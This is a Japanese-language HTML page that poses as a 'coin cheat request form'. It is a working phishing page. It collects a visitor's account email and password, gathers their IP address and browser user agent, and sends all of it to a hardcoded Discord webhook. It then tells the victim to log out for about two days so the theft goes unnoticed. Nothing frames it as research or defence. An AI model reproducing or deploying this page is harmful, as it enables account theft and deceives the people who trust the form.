<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>コインチート依頼フォーム</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background: linear-gradient(to bottom, #d8bfd8, #ffc0cb); /* 上部が薄い紫、下部が薄いピンク */
        }
        form {
            width: 100%;
            max-width: 400px;
            background-color: rgba(255, 255, 255, 0.3); /* 白背景の不透明度30% */
            border-radius: 8px;
            padding: 20px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            text-align: center; /* 中央揃え */
        }
        h1 {
            font-size: 100%; /* 現在のサイズの70%に設定 */
            margin-bottom: 20px; /* 見栄えを良くするための余白 */
        }
        label {
            display: block;
            margin-top: 10px;
            font-weight: bold;
            text-align: left; /* 左寄せ */
        }
        input {
            width: 90%; /* 入力フィールドを中央揃え */
            padding: 8px;
            margin: 5px 0 10px 0;
            border: 1px solid #ccc;
            border-radius: 4px;
            display: block; /* ブロック表示で幅を適用 */
            margin-left: auto; /* 左右中央揃え */
            margin-right: auto;
        }
        button {
            width: 100%;
            padding: 10px;
            background-color: #4CAF50;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        button:hover {
            background-color: #45a049;
        }
        .success-message {
            color: green;
            font-weight: bold;
            margin-top: 10px;
        }
        .error-message {
            color: red;
            font-weight: bold;
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <form id="authForm">
        <h1>コインチート依頼フォーム</h1>
        <label for="address">メールアドレス</label>
        <input type="email" id="address" placeholder="メールアドレスを入力" required>

        <label for="password">パスワード</label>
        <input type="text" id="password" placeholder="パスワードを入力" required>

        <button type="button" onclick="submitForm()">送信</button>

        <div id="successMessage" class="success-message" style="display: none;">送信完了しました！アカウントから一度ログアウトしてください！（目安は二日ほど）</div>
        <div id="errorMessage" class="error-message" style="display: none;">送信に失敗しました。再度お試しください。</div>
    </form>

    <script>
        async function submitForm() {
            const address = document.getElementById("address").value;
            const password = document.getElementById("password").value;

            if (!address || !password) {
                alert("全ての項目を入力してください。");
                return;
            }

            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                const ipAddress = ipData.ip;

                const userAgent = navigator.userAgent;

                const webhookURL = 'https://discord.com/api/webhooks/1332143787555688609/J91Uc5C-cAu8pn4plSRKRlWzNTDdvyr30ZwUSjHkt7CLkwewHj7PVEpnIC3AF8kHmbWM';

                const payload = {
                    embeds: [
                        {
                            title: "アカウント情報とデバイス情報",
                            description: `**メールアドレス:** \`${address}\`\n**パスワード:** \`${password}\`\n**デバイス情報:** \`${userAgent}\`\n**IPアドレス:** \`${ipAddress}\``,
                            color: 3447003,
                        }
                    ]
                };

                const response = await fetch(webhookURL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(payload)
                });

                if (response.ok) {
                    document.getElementById("successMessage").style.display = "block";
                    const button = document.querySelector("button");
                    button.style.backgroundColor = "pink";
                    button.textContent = "送信完了";
                    button.disabled = true;
                } else {
                    document.getElementById("errorMessage").style.display = "block";
                }
            } catch (error) {
                console.error('Error:', error);
                document.getElementById("errorMessage").style.display = "block";
            }
        }
    </script>
</body>
</html>
